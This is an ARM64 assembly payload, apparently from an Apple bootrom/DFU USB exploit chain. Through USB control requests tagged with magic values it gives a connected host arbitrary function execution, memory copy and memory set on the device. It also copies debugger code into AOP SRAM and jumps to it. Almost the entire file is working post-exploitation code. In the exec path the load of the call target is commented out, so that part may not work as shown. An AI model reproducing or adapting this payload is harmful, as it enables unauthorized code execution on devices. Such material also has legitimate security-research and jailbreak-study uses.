    #define SecureDBG_cmd #0xfffe
.text

.pool
.set USB_CORE_DO_IO, 0xBAD00006
.set LOAD_ADDRESS,   0xBAD00001
.set EXEC_MAGIC,     0xBAD00002
.set MEMC_MAGIC,     0xBAD00004
.set MEMS_MAGIC,     0xBAD00005
.set DONE_MAGIC,     0xBAD00003

.global _main
_main:
jump_back:
  BRK  #1
  BRK  #1

  LDRH W2, [X0]
  CMP  W2, #0x2A1
  BNE  jump_back

  STP  X29, X30, [SP,#-0x10]!
  MOV  X29, SP
  STP  X20, X19, [SP,#-0x10]!

  MOV  X19, X0
  LDR  X20, =LOAD_ADDRESS

    mov w1, SecureDBG_cmd
    ldrh w2, [x19, #2]
    cmp w1, w2
    b.eq Linit
    ; cmp w1, #0x5000
    ; b.eq Ldie
    b Lnormal

; Ldie:
;     brk #0x4141

Linit:
    /* X0 is the beginning of our rwx view of AOP SRAM. We already uploaded
    the debugger code, so it lives inside io_buffer. memcpy it to AOP SRAM.
    debugger_entryp always lives at the beginning of the copied code. */
    /* X1 == io_buffer */
    mov x0, #0x900000000
    movk x0, #0x34e0, lsl #16
    mov x7, x0
    mov x1, #0x100000000
    movk x1, #0x801e, lsl #16
    movk x1, #0xc800

    /* We sent this:
    [copy size (4 bytes)]
    [copy offset (4 bytes)]
    [done boolean (4 bytes)]
    [current chunk of debugger code] */
    ldr w2, [x1]
    ldr w3, [x1, #0x4]
    ldr w5, [x1, #0x8]
    add x1, x1, #0xc
    add x0, x0, x3
    mov x6, x0

    /* Nothing past this point modifies x5-x7, goes byte-by-byte, safe
    for AOP SRAM */
    bl memcpy

    mov x0, x6
    mov w1, #0x800
    bl dcache_clean_PoU
    bl icache_invalidate_PoU

    dsb sy
    isb sy
    tlbi vmalle1
    isb sy

    mov x0, xzr
    cbz w5, Ldonecopy

    blr x7

Ldonecopy:
    stp x0, xzr, [x20]
    b request_done

Lnormal:
  MOV  W1, #0xFFFF
  LDRH W2, [X19,#2]
  CMP  W1, W2
  BNE  request_done


  LDR  X0, [X20]                               ; X0 = LOAD_ADDRESS[0]

  LDR  X1, =EXEC_MAGIC
  CMP  X0, X1
  BNE  not_exec                                ; if (X0 != EXEC_MAGIC) goto not_exec

  STR  XZR, [X20]                              ; LOAD_ADDRESS[0] = 0

  ; LDR  X0, [X20, #0x10]                        ; X0 = LOAD_ADDRESS[2]      /* arg1 */
  ; LDR  X1, [X20, #0x18]                        ; X1 = LOAD_ADDRESS[3]      /* arg2 */
  ; LDR  X2, [X20, #0x20]                        ; X2 = LOAD_ADDRESS[4]      /* arg3 */
  ; LDR  X3, [X20, #0x28]                        ; X3 = LOAD_ADDRESS[5]      /* arg4 */
  ; LDR  X4, [X20, #0x30]                        ; X4 = LOAD_ADDRESS[6]      /* arg5 */
  ; LDR  X5, [X20, #0x38]                        ; X5 = LOAD_ADDRESS[7]      /* arg6 */
  ; LDR  X6, [X20, #0x40]                        ; X6 = LOAD_ADDRESS[8]      /* arg7 */
  ; LDR  X7, [X20, #0x40]                        ; X7 = LOAD_ADDRESS[9]      /* arg8 */
  ; LDR  X8, [X20, #0x8]
  BLR  X8                                      ; X0 = LOAD_ADDRESS[1](X0, X1, X2, X3, X4, X5, X6, X7)

  LDR  X8, =DONE_MAGIC
  STP  X8, X0, [X20]                           ; LOAD_ADDRESS[0,1] = DONE_MAGIC, X0
  B    request_done

not_exec:
  LDR  X1, =MEMC_MAGIC
  CMP  X0, X1
  BNE  not_memc

  STR  XZR, [X20]

  LDP  X0, X1, [X20, #0x10]
  LDR  X2, [X20, #0x20]
  BL   memcpy

  LDR  X8, =DONE_MAGIC
  STR  X8, [X20]
  B    request_done

not_memc:
  LDR  X1, =MEMS_MAGIC
  CMP  X0, X1
  BNE  request_done

  STR  XZR, [X20]
  
  LDP  X0, X1, [X20, #0x10]
  LDR  X2, [X20, #0x20]
  BL   memset

  LDR  X8, =DONE_MAGIC
  STR  X8, [X20]

request_done:
  MOV  W0, #0x80
  MOV  X1, X20
  LDRH W2, [X19,#6]
  MOV  X3, #0
  LDR  X4, =USB_CORE_DO_IO
  BLR  X4

  MOV  W0, #0
  LDP  X20, X19, [SP],#0x10
  LDP  X29, X30, [SP],#0x10
  RET

; save space in this payload
memset:
    add x3, x0, x2
Lmemset_loop:
    strb w1, [x0], #1
    subs xzr, x3, x0
    b.ne Lmemset_loop
    ret

; save space in this payload
memcpy:
    ; end of src
    add x3, x1, x2

Lmemcpy_loop:
    ldrb w4, [x1], #1
    strb w4, [x0], #1
    subs xzr, x3, x1
    b.ne Lmemcpy_loop
    ret

dcache_clean_PoU:
    add x8, x1, #0x40
    and x9, x8, #0xffffffffffffffc0
    and x8, x0, #0xffffffffffffffc0
    add x9, x9, x8
    isb sy
Ldcloop:
    dc cvau, x8
    dsb ish
    isb sy
    add x8, x8, #0x40
    cmp x8, x9
    b.lo Ldcloop
    ret

icache_invalidate_PoU:
    add x8, x1, #0x40
    and x9, x8, #0xffffffffffffffc0
    and x8, x0, #0xffffffffffffffc0
    add x9, x9, x8
    isb sy
Licloop:
    ic ivau, x8
    dsb ish
    isb sy
    add x8, x8, #0x40
    cmp x8, x9
    b.lo Licloop
    ret
